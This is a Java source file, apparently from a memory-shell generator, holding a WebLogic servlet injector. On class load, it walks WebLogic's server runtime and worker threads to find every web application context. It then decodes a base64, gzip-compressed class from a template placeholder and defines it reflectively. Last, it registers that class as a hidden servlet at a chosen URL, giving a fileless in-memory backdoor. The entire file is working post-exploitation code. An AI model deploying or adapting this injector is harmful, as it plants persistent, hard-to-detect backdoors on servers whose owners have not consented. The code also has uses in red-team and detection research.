package com.reajason.javaweb.memshell.injector.weblogic;

import javax.servlet.Servlet;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 */
public class WebLogicServletInjector {

    static {
        new WebLogicServletInjector();
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public WebLogicServletInjector() {
        try {
            Object[] contexts = getContext();
            for (Object context : contexts) {
                Object servlet = getShell(context);
                inject(context, servlet);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static Object[] getContextsByMbean() throws Throwable {
        Set<Object> webappContexts = new HashSet<Object>();
        Class<?> serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime");
        Class<?> webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
        Method theOneMethod = serverRuntimeClass.getMethod("theOne");
        theOneMethod.setAccessible(true);
        Object serverRuntime = theOneMethod.invoke(null);
        Method getApplicationRuntimesMethod = serverRuntime.getClass().getMethod("getApplicationRuntimes");
        getApplicationRuntimesMethod.setAccessible(true);
        Object applicationRuntimes = getApplicationRuntimesMethod.invoke(serverRuntime);
        int applicationRuntimeSize = Array.getLength(applicationRuntimes);
        for (int i = 0; i < applicationRuntimeSize; i++) {
            Object applicationRuntime = Array.get(applicationRuntimes, i);
            try {
                Method getComponentRuntimesMethod = applicationRuntime.getClass().getMethod("getComponentRuntimes");
                Object componentRuntimes = getComponentRuntimesMethod.invoke(applicationRuntime);
                int componentRuntimeSize = Array.getLength(componentRuntimes);
                for (int j = 0; j < componentRuntimeSize; j++) {
                    Object context = getFieldValue(Array.get(componentRuntimes, j), "context");
                    if (webAppServletContextClass.isInstance(context)) {
                        webappContexts.add(context);
                    }
                }
            } catch (Throwable ignored) {
            }

            try {
                Set<Object> childrenSet = (Set<Object>) getFieldValue(applicationRuntime, "children");
                for (Object componentRuntime : childrenSet) {
                    try {
                        Object context = getFieldValue(componentRuntime, "context");
                        if (webAppServletContextClass.isInstance(context)) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable ignored) {
                    }
                }
            } catch (Throwable ignored) {
            }
        }
        return webappContexts.toArray();
    }

    public static Object[] getContextsByThreads() throws Throwable {
        Set<Object> webappContexts = new HashSet<Object>();
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        int threadCount = threadGroup.activeCount();
        Thread[] threads = new Thread[threadCount];
        threadGroup.enumerate(threads);
        for (int i = 0; i < threadCount; i++) {
            Thread thread = threads[i];
            if (thread != null) {
                Object workEntry = getFieldValue(thread, "workEntry");
                if (workEntry != null) {
                    try {
                        Object context = null;
                        Object connectionHandler = getFieldValue(workEntry, "connectionHandler");
                        if (connectionHandler != null) {
                            Object request = getFieldValue(connectionHandler, "request");
                            if (request != null) {
                                context = getFieldValue(request, "context");
                            }
                        }
                        if (context == null) {
                            context = getFieldValue(workEntry, "context");
                        }

                        if (context != null) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable ignored) {
                    }
                }
            }
        }
        return webappContexts.toArray();
    }

    public static Object[] getContext() {
        Set<Object> webappContexts = new HashSet<Object>();
        try {
            webappContexts.addAll(Arrays.asList(getContextsByMbean()));
        } catch (Throwable ignored) {
        }
        try {
            webappContexts.addAll(Arrays.asList(getContextsByThreads()));
        } catch (Throwable ignored) {
        }
        return webappContexts.toArray();
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            return classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }

    /**
     * server/lib/weblogic.jar
     * weblogic.servlet.internal.WebAppServletContext
     */
    public void inject(Object context, Object servlet) throws Exception {
        // weblogic.servlet.utils.URLMapping
        Object servletMapping = invokeMethod(context, "getServletMapping", null, null);
        Class<?> webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
        Class<?> servletStubImplClass = Class.forName("weblogic.servlet.internal.ServletStubImpl");
        Object servletStub = null;
        Constructor<?> servletStubImplConstructor = null;
        try {
            servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, Servlet.class, webAppServletContextClass);
            servletStubImplConstructor.setAccessible(true);
            servletStub = servletStubImplConstructor.newInstance(getClassName(), servlet, context);
        } catch (NoSuchMethodException e) {
            // 10.3.6
            servletStubImplConstructor = servletStubImplClass.getDeclaredConstructor(String.class, String.class, webAppServletContextClass, Map.class);
            servletStubImplConstructor.setAccessible(true);
            servletStub = servletStubImplConstructor.newInstance(getClassName(), getClassName(), context, null);
        }
        Constructor<?> urlMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, servletStubImplClass);
        urlMatchHelperConstructor.setAccessible(true);
        Object urlMatchHelper = urlMatchHelperConstructor.newInstance(getUrlPattern(), servletStub);
        Object mapping = invokeMethod(servletMapping, "get", new Class[]{String.class}, new Object[]{getUrlPattern()});
        if (mapping == null) {
            invokeMethod(servletMapping, "put", new Class[]{String.class, Object.class}, new Object[]{getUrlPattern(), urlMatchHelper});
            System.out.println("servlet inject successful");
        } else {
            System.out.println("servlet already injected");
        }
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = obj.getClass();
        Method method = clazz.getDeclaredMethod(methodName, paramClazz);
        method.setAccessible(true);
        return method.invoke(obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }
}
